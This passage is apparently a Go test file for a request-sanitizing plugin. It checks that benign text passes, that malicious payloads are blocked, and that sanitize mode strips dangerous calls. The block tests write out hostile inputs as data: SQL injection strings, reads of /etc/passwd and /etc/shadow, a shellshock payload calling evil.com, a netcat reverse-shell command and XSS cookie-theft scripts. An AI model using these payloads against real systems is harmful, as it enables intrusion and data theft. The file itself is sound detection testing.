		// JavaScript — removed patterns
		{name: "js/fetch", body: `{"msg": "I used fetch to get the API data"}`},
		{name: "js/window", body: `{"msg": "the window.innerWidth is 1024"}`},
		{name: "js/document", body: `{"msg": "document.title shows the page name"}`},
		{name: "js/localStorage", body: `{"msg": "use localStorage.getItem('theme') for persistence"}`},
		{name: "js/addEventListener", body: `{"msg": "call addEventListener for click events"}`},
		{name: "js/innerHTML", body: `{"msg": "innerHTML is a DOM property for rendering HTML"}`},
		{name: "js/websocket", body: `{"msg": "the websocket connection dropped unexpectedly"}`},
		{name: "js/crypto", body: `{"msg": "crypto.subtle provides browser encryption APIs"}`},
		{name: "js/location", body: `{"msg": "location.href returns the current URL"}`},
		{name: "js/history", body: `{"msg": "history.back() goes to the previous page"}`},

		// Python — removed patterns
		{name: "py/compile", body: `{"msg": "I need to compile the code before deploying"}`},
		{name: "py/open", body: `{"msg": "open the file and read its contents"}`},
		{name: "py/os.path", body: `{"msg": "use os.path.join for cross-platform paths"}`},
		{name: "py/sys.argv", body: `{"msg": "sys.argv contains command line arguments"}`},
		{name: "py/pickle", body: `{"msg": "pickle.dumps serializes Python objects"}`},
		{name: "py/getattr", body: `{"msg": "use getattr to access dynamic attributes"}`},
		{name: "py/globals", body: `{"msg": "globals and locals are built-in functions"}`},
		{name: "py/import", body: `{"msg": "import os; import sys"}`},
		{name: "py/yaml", body: `{"msg": "yaml.load is used for parsing YAML files"}`},

		// PHP — removed patterns
		{name: "php/system", body: `{"msg": "the system is running fine today"}`},
		{name: "php/include", body: `{"msg": "please include this in the report"}`},
		{name: "php/require", body: `{"msg": "we require more resources for the project"}`},
		{name: "php/assert", body: `{"msg": "assert your rights in the meeting"}`},
		{name: "php/exec", body: `{"msg": "the exec team approved the budget"}`},
		{name: "php/header", body: `{"msg": "check the header section of the document"}`},
		{name: "php/extract", body: `{"msg": "extract the data from the CSV file"}`},
		{name: "php/fopen", body: `{"msg": "use fopen to read configuration files"}`},
		{name: "php/file_get_contents", body: `{"msg": "file_get_contents downloads the page"}`},

		// SQL — removed patterns
		{name: "sql/grant", body: `{"msg": "Grant Smith is the new CTO"}`},
		{name: "sql/revoke", body: `{"msg": "we may revoke access if terms are violated"}`},
		{name: "sql/benchmark", body: `{"msg": "this is a benchmark test for performance"}`},

		// Shell — removed standalone commands
		{name: "shell/cat", body: `{"msg": "the cat sat on the mat"}`},
		{name: "shell/curl", body: `{"msg": "curl up with a good book tonight"}`},
		{name: "shell/echo", body: `{"msg": "the echo chamber effect in social media"}`},
		{name: "shell/touch", body: `{"msg": "touch base with the team tomorrow"}`},
		{name: "shell/grep", body: `{"msg": "use grep to search for patterns in files"}`},
		{name: "shell/ssh", body: `{"msg": "how do I use ssh to connect to a remote server?"}`},
		{name: "shell/mkdir", body: `{"msg": "mkdir creates a new directory on the filesystem"}`},
		{name: "shell/sudo", body: `{"msg": "sudo is used for admin access on Linux"}`},
		{name: "shell/awk", body: `{"msg": "use awk for text processing and data extraction"}`},
		{name: "shell/wget", body: `{"msg": "use wget to download files from the internet"}`},
		{name: "shell/backtick_markdown", body: "{\"msg\": \"use `variable_name` in your code\"}"},

		// Java — removed patterns
		{name: "java/exit", body: `{"msg": "System.exit(0) terminates the JVM process"}`},
		{name: "java/getMethod", body: `{"msg": "use .getMethod to inspect available APIs"}`},
		{name: "java/invoke", body: `{"msg": "call .invoke on the reflected method object"}`},
		{name: "java/newInstance", body: `{"msg": "create .newInstance of the target class"}`},
		{name: "java/SecurityManager", body: `{"msg": "SecurityManager restricts runtime permissions"}`},

		// C# — removed patterns
		{name: "csharp/StandardOutput", body: `{"msg": "read process.StandardOutput for command results"}`},
		{name: "csharp/FromBase64String", body: `{"msg": "Convert.FromBase64String decodes Base64 data"}`},
		{name: "csharp/IO.File", body: `{"msg": "System.IO.File.ReadAllText reads a text file"}`},
		{name: "csharp/WebClient", body: `{"msg": "System.Net.WebClient downloads web resources"}`},
		{name: "csharp/XmlReader", body: `{"msg": "XmlReader.Create is used to parse XML documents"}`},

		// Ruby — removed patterns
		{name: "ruby/system", body: `{"msg": "the system works correctly in production"}`},
		{name: "ruby/send", body: `{"msg": "send me the report by end of day"}`},
		{name: "ruby/File", body: `{"msg": "use File.read to load configuration data"}`},
		{name: "ruby/Dir", body: `{"msg": "Dir.glob finds files matching a pattern"}`},
		{name: "ruby/Net::HTTP", body: `{"msg": "Net::HTTP.get fetches remote API responses"}`},
		{name: "ruby/JSON.load", body: `{"msg": "JSON.load parses the API response body"}`},

		// HTML — removed patterns
		{name: "html/basic_tags", body: `{"msg": "<html><body><h1>Hello World</h1></body></html>"}`},
		{name: "html/form_tags", body: `{"msg": "<form action='/submit'><input type='text'><button>Send</button></form>"}`},
		{name: "html/media_tags", body: `{"msg": "<video src='movie.mp4' controls></video>"}`},
		{name: "html/meta_tag", body: `{"msg": "<meta charset='utf-8'>"}`},
		{name: "html/link_tag", body: `{"msg": "<link rel='stylesheet' href='style.css'>"}`},
		{name: "html/style_tag", body: `{"msg": "<style>body { color: red; }</style>"}`},
		{name: "html/svg_tag", body: `{"msg": "<svg viewBox='0 0 100 100'></svg>"}`},
		{name: "html/expression_word", body: `{"msg": "the expression was evaluated as true"}`},
		{name: "html/base64_word", body: `{"msg": "encode it in base64 format for transport"}`},
		{name: "html/import_css", body: `{"msg": "use @import for CSS module composition"}`},
		{name: "html/url_css", body: `{"msg": "use url() in CSS background declarations"}`},
		{name: "html/title_tag", body: `{"msg": "<title>My Page Title</title>"}`},
		{name: "html/window_word", body: `{"msg": "window.innerWidth returns the viewport width"}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &types.RequestContext{
				Body: []byte(tt.body),
			}
			res := &types.ResponseContext{}
			evtCtx := metrics.NewEventContext("", "", nil)

			resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

			assert.NoError(t, err, "should NOT be blocked: %s", tt.name)
			assert.NotNil(t, resp, "should return a response: %s", tt.name)
			assert.Equal(t, http.StatusOK, resp.StatusCode)

			var expected, actual interface{}
			if json.Unmarshal([]byte(tt.body), &expected) == nil {
				require.NoError(t, json.Unmarshal(req.Body, &actual))
				assert.Equal(t, expected, actual, "content must remain unchanged: %s", tt.name)
			} else {
				assert.Equal(t, tt.body, string(req.Body), "body must remain unchanged: %s", tt.name)
			}
		})
	}
}

// ============================================================================
// Detection Coverage — malicious payloads that MUST be caught
// ============================================================================

func TestCodeSanitationPlugin_DetectionCoverage_Block(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "enforce",
			"status_code":         400,
		},
	}

	tests := []struct {
		name string
		body string
	}{
		// JavaScript
		{name: "js/eval", body: `{"code": "eval('alert(1)')"}`},
		{name: "js/new_Function", body: `{"code": "new Function('return document.cookie')()"}`},
		{name: "js/setTimeout_string", body: `{"code": "setTimeout('alert(1)', 100)"}`},
		{name: "js/setInterval_string", body: `{"code": "setInterval('stealData()', 1000)"}`},
		{name: "js/document_write", body: `{"code": "document.write('<h1>XSS</h1>')"}`},
		{name: "js/script_tag", body: `{"code": "<script>alert(1)</script>"}`},
		{name: "js/script_tag_json_escaped", body: `{"code": "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e"}`},
		{name: "js/execScript", body: `{"code": "execScript('code')"}`},

		// Python
		{name: "py/eval", body: `{"code": "eval('2+2')"}`},
		{name: "py/exec", body: `{"code": "exec('import os')"}`},
		{name: "py/__import__", body: `{"code": "__import__('os').system('id')"}`},
		{name: "py/subprocess", body: `{"code": "subprocess.call(['ls', '-la'])"}`},
		{name: "py/os.system", body: `{"code": "os.system('whoami')"}`},
		{name: "py/os.popen", body: `{"code": "os.popen('id').read()"}`},

		// PHP
		{name: "php/eval", body: `{"code": "eval('echo 1;')"}`},
		{name: "php/passthru", body: `{"code": "passthru('whoami')"}`},
		{name: "php/shell_exec", body: `{"code": "shell_exec('ls -la')"}`},
		{name: "php/proc_open", body: `{"code": "proc_open('cmd', $desc, $pipes)"}`},
		{name: "php/popen", body: `{"code": "popen('ls', 'r')"}`},
		{name: "php/unserialize", body: `{"code": "unserialize($user_input)"}`},
		{name: "php/create_function", body: `{"code": "create_function('$a', 'return $a;')"}`},

		// SQL
		{name: "sql/select_from", body: `{"q": "SELECT * FROM users WHERE id=1"}`},
		{name: "sql/union_select", body: `{"q": "' UNION SELECT password FROM users--"}`},
		{name: "sql/drop_table", body: `{"q": "'; DROP TABLE users--"}`},
		{name: "sql/insert_into", body: `{"q": "INSERT INTO admins VALUES(1,'hacker','pass')"}`},
		{name: "sql/delete_from", body: `{"q": "DELETE FROM sessions WHERE 1=1"}`},
		{name: "sql/waitfor_delay", body: `{"q": "'; WAITFOR DELAY '0:0:10'--"}`},
		{name: "sql/into_outfile", body: `{"q": "SELECT * INTO OUTFILE '/tmp/dump.csv' FROM users"}`},

		// Shell
		{name: "shell/bash_c", body: `{"cmd": "bash -c 'whoami'"}`},
		{name: "shell/sh_c", body: `{"cmd": "sh -c 'id'"}`},
		{name: "shell/bin_bash", body: `{"cmd": "/bin/bash -i"}`},
		{name: "shell/rm_rf", body: `{"cmd": "rm -rf /tmp/data"}`},
		{name: "shell/perl_e", body: `{"cmd": "perl -e 'print 1'"}`},
		{name: "shell/python_c", body: `{"cmd": "python -c 'import os'"}`},
		{name: "shell/cat_etc_passwd", body: `{"cmd": "cat /etc/passwd"}`},
		{name: "shell/cat_etc_shadow", body: `{"cmd": "cat /etc/shadow"}`},
		{name: "shell/shellshock", body: `{"cmd": "() { :; }; curl http://evil.com"}`},
		{name: "shell/nc_reverse", body: `{"cmd": "nc -lvvp 4444 -e /bin/bash"}`},
		{name: "shell/ssi_exec", body: `{"cmd": "<!--#exec cmd='ls'-->"}`},
		{name: "shell/template_injection", body: `{"cmd": "{{get_user_file('/etc/passwd')}}"}`},

		// Java
		{name: "java/runtime_exec", body: `{"code": "Runtime.getRuntime().exec('calc')"}`},
		{name: "java/ProcessBuilder", body: `{"code": "new ProcessBuilder('cmd').start()"}`},
		{name: "java/Class.forName", body: `{"code": "Class.forName('java.lang.Runtime')"}`},
		{name: "java/ScriptEngine", body: `{"code": "new ScriptEngine().eval('code')"}`},
		{name: "java/setAccessible", body: `{"code": "field.setAccessible(true)"}`},
		{name: "java/deserialize", body: `{"code": "ois.deserialize(data)"}`},

		// C#
		{name: "csharp/Process.Start", body: `{"code": "System.Diagnostics.Process.Start('cmd.exe')"}`},
		{name: "csharp/new_Process", body: `{"code": "var p = new Process(); p.Start()"}`},
		{name: "csharp/Assembly.Load", body: `{"code": "System.Reflection.Assembly.Load(bytes)"}`},
		{name: "csharp/BinaryFormatter", body: `{"code": "new BinaryFormatter().Deserialize(stream)"}`},
		{name: "csharp/CSharpCodeProvider", body: `{"code": "new CSharpCodeProvider().CompileAssembly()"}`},

		// Ruby
		{name: "ruby/eval", body: `{"code": "eval('puts secret')"}`},
		{name: "ruby/Open3", body: `{"code": "Open3.capture2('ls -la')"}`},
		{name: "ruby/Marshal.load", body: `{"code": "Marshal.load(user_data)"}`},
		{name: "ruby/YAML.load", body: `{"code": "YAML.load(untrusted_input)"}`},
		{name: "ruby/ERB.new", body: `{"code": "ERB.new(template).result"}`},
		{name: "ruby/instance_eval", body: `{"code": "obj.instance_eval('secret_method')"}`},
		{name: "ruby/class_eval", body: `{"code": "User.class_eval('def admin?; true; end')"}`},
		{name: "ruby/constantize", body: `{"code": "'Admin'.constantize.new"}`},

		// HTML
		{name: "html/script_tag", body: `{"msg": "<script>alert(document.cookie)</script>"}`},
		{name: "html/iframe", body: `{"msg": "<iframe src='http://evil.com'></iframe>"}`},
		{name: "html/object", body: `{"msg": "<object data='evil.swf'></object>"}`},
		{name: "html/embed", body: `{"msg": "<embed src='evil.swf'>"}`},
		{name: "html/applet", body: `{"msg": "<applet code='Evil.class'></applet>"}`},
		{name: "html/onerror", body: `{"msg": "img onerror=alert(1)"}`},
		{name: "html/onclick", body: `{"msg": "div onclick=stealCookies()"}`},
		{name: "html/javascript_proto", body: `{"msg": "javascript:alert(document.cookie)"}`},
		{name: "html/vbscript_proto", body: `{"msg": "vbscript:MsgBox('XSS')"}`},
		{name: "html/data_uri_html", body: `{"msg": "data:text/html,<script>alert(1)</script>"}`},
		{name: "html/data_uri_js", body: `{"msg": "data:text/javascript,alert(1)"}`},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &types.RequestContext{
				Body: []byte(tt.body),
			}
			res := &types.ResponseContext{}
			evtCtx := metrics.NewEventContext("", "", nil)

			resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

			assert.Error(t, err, "should be BLOCKED: %s", tt.name)
			assert.Nil(t, resp, "response must be nil when blocked: %s", tt.name)
		})
	}
}

func TestCodeSanitationPlugin_DetectionCoverage_Sanitize(t *testing.T) {
	plugin := newPlugin()
	ctx := context.Background()

	cfg := plugintypes.PluginConfig{
		Settings: map[string]interface{}{
			"apply_all_languages": true,
			"content_to_check":    []interface{}{"body"},
			"mode":              "sanitize",
		},
	}

	tests := []struct {
		name      string
		body      string
		field     string
		notContain string
		contain   string
	}{
		{
			name: "js/eval unwraps argument",
			body: `{"code": "eval('alert(1)')"}`, field: "code",
			notContain: "eval", contain: "alert(1)",
		},
		{
			name: "py/exec unwraps argument",
			body: `{"code": "exec('print(1)')"}`, field: "code",
			notContain: "exec", contain: "print(1)",
		},
		{
			name: "py/os.system strips dangerous call",
			body: `{"code": "import os; os.system('id')"}`, field: "code",
			notContain: "os.system", contain: "import os",
		},
		{
			name: "php/shell_exec unwraps",
			body: `{"code": "shell_exec('whoami')"}`, field: "code",
			notContain: "shell_exec", contain: "whoami",
		},
		{
			name: "php/passthru unwraps",
			body: `{"code": "passthru('id')"}`, field: "code",
			notContain: "passthru", contain: "id",
		},
		{
			name: "ruby/eval unwraps",
			body: `{"code": "eval('puts hello')"}`, field: "code",
			notContain: "eval", contain: "puts hello",
		},
		{
			name: "html/iframe stripped",
			body: `{"msg": "<iframe src='evil'></iframe>"}`, field: "msg",
			notContain: "<iframe",
		},
		{
			name: "html/script stripped",
			body: `{"msg": "<script>alert(1)</script>"}`, field: "msg",
			notContain: "<script",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			req := &types.RequestContext{
				Body: []byte(tt.body),
			}
			res := &types.ResponseContext{}
			evtCtx := metrics.NewEventContext("", "", nil)

			resp, err := plugin.Execute(ctx, cfg, req, res, evtCtx)

			assert.NoError(t, err)
			assert.NotNil(t, resp)

			var result map[string]string
			err = json.Unmarshal(req.Body, &result)
			require.NoError(t, err)
			assert.NotContains(t, result[tt.field], tt.notContain,
				"dangerous pattern should be removed: %s", tt.name)
			if tt.contain != "" {
				assert.Contains(t, result[tt.field], tt.contain,
					"safe content should be preserved: %s", tt.name)
			}
		})
	}
}
